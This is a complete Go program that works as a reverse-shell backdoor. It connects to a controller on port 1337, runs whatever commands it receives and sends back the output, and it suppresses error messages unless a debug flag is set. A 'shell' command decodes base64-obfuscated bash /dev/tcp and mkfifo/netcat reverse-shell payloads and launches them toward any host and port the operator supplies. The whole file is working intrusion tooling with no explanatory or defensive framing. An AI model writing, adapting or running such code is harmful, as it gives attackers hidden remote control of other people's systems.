package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"
)

var Debug = false

var Reset = "\033[0m"
var Blue = "\033[34m"
var Green = "\033[32m"

var DumbPayload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8lcy8lcyAwPiYx"
var NCPayload = "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgJXMgJXMgPi90bXAvZg=="

func spawnRevshell(commandTokens []string) {
	var command string
	var decoded []byte

	switch strings.TrimSpace(commandTokens[1]) {
	case "dumb":
		decoded, _ = base64.StdEncoding.DecodeString(DumbPayload)
	case "nc":
		decoded, _ = base64.StdEncoding.DecodeString(NCPayload)
	}

	command = fmt.Sprintf(string(decoded), strings.TrimSpace(commandTokens[2]), strings.TrimSpace(commandTokens[3]))
	fmt.Println(command)
	cmd := exec.Command("bash", "-c", command)

	err := cmd.Start()
	if err != nil && Debug {
		log.Fatalf("Failed to start shell: %s", err)
	} else if Debug {
		log.Println("Shell started successfully.")
	}
}

func changeDirectory(conn net.Conn, commandTokens []string) {
	if len(commandTokens) < 2 && Debug {
		fmt.Fprintf(conn, "Usage: cd <directory>\n")
		return
	}

	err := os.Chdir(strings.TrimSpace(commandTokens[1]))
	if err != nil && Debug {
		fmt.Fprintf(conn, "Failed to change directory: %s\n", err)
	} else if Debug {
		newDirectory, _ := os.Getwd()
		fmt.Fprintf(conn, "Changed directory to %s\n", newDirectory)
	}
}

func main() {
	conn, err := net.Dial("tcp", "localhost:1337")
	if err != nil && Debug {
		fmt.Println("Failed to connect:", err)
		return
	}
	defer conn.Close()

	reader := bufio.NewReader(conn)

	for {
		user, _ := user.Current()
		hostname, _ := os.Hostname()
		currentWorkingDirectory, _ := os.Getwd()
		_, err := fmt.Fprintf(conn, Blue+user.Username+"@"+hostname+":"+Reset+Green+currentWorkingDirectory+Reset+Blue+"$ "+Reset)
		if err != nil && Debug {
			fmt.Println("Failed to write prompt to connection:", err)
			break
		}

		message, err := reader.ReadString('\n')
		if err != nil && Debug {
			fmt.Println("Failed to read from connection:", err)
			break
		}

		commandTokens := strings.Split(strings.TrimSpace(message), " ")

		if strings.TrimSpace(commandTokens[0]) == "cd" {
			changeDirectory(conn, commandTokens)
			continue
		} else if strings.TrimSpace(commandTokens[0]) == "shell" {
			spawnRevshell(commandTokens)
			continue
		}

		cmd := exec.Command(commandTokens[0], commandTokens[1:]...)
		var out bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &out

		err = cmd.Start()
		if err != nil && Debug {
			fmt.Fprintf(conn, "Error starting command: %s\n", err)
			continue
		}

		done := make(chan error, 1)
		go func() {
			done <- cmd.Wait()
		}()

		err = <-done
		if err != nil && Debug {
			fmt.Fprintf(conn, "Command execution error: %s\n", err)
		} else {
			output := out.String()
			fmt.Fprintf(conn, "%s\n", output)
		}
	}
}
